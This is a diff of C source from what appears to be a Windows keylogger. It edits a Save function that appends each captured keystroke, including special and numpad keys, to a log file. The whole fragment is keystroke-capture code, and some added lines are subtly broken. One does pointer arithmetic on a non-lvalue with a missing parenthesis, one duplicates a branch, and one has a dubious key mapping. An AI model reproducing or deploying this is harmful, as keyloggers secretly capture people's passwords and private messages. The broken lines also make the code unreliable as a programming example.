@@ -100,7 +100,7 @@ int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
    if (key_stroke == 8)
       fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
-      fprintf(OUTPUT_FILE, "%s", "\n");
+      fprintf(OUTPUT_FILE, "%s", "[Enter]");
    else if (key_stroke == 32)
       fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
@@ -125,7 +125,21 @@ int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
       fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
       fprintf(OUTPUT_FILE, "%s", ".");
-   else
+   else if (key_stroke == 186)
+	   fprintf(OUTPUT_FILE, "%s","@");
+   else if(key_stroke >= 96 && key_stroke <= 105)
+	   fprintf(OUTPUT_FILE, "%s",&(key_stroke-48);
+   else if(key_stroke == 106)
+	   fprintf(OUTPUT_FILE, "%s","*");
+   else if(key_stroke == 107)
+	   fprintf(OUTPUT_FILE, "%s","+");
+   else if(key_stroke == 109)
+	   fprintf(OUTPUT_FILE, "%s","-");
+   else if(key_stroke == 110)
+	   fprintf(OUTPUT_FILE, "%s",".");
+   else if(key_stroke == 111)
+	   fprintf(OUTPUT_FILE, "%s","/");
+   else 
       fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
    return 0;
